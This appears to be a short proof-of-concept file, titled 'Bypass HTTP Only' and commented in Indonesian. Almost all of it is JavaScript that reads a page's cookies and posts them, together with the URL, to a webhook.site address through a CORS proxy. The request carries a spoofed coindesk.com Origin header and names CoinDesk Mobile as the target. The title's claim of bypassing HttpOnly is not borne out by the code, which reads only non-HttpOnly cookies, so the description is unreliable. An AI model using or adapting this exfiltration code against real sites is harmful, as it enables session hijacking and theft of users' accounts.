# poc
Proof Of Concept Vulnerability

# Bypass HTTP Only
// Ambil cookie dulu
const cookies = document.cookie;
console.log('Cookie lengkap:', cookies);

// Kirim via proxy CORS (cors-anywhere.herokuapp.com – gratis, no signup)
const proxyUrl = 'https://cors-anywhere.herokuapp.com/https://webhook.site/590ea786-c800-4823-b014-deec262c943e';
fetch(proxyUrl, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Origin': 'https://coindesk.com'  // Fake origin biar lolos
  },
  body: JSON.stringify({
    cookies: cookies,
    url: location.href,
    timestamp: new Date().toISOString(),
    proof: 'Remote WebView Debugging - CoinDesk Mobile'
  })
}).then(response => {
  console.log('Berhasil dikirim! Status:', response.status);
  alert('Cookie berhasil terkirim ke webhook!');
}).catch(err => {
  console.error('Error:', err);
  // Fallback: tampilkan di alert kalau gagal
  alert('Cookie (copy manual):\n' + cookies.substring(0, 500) + '...');
});
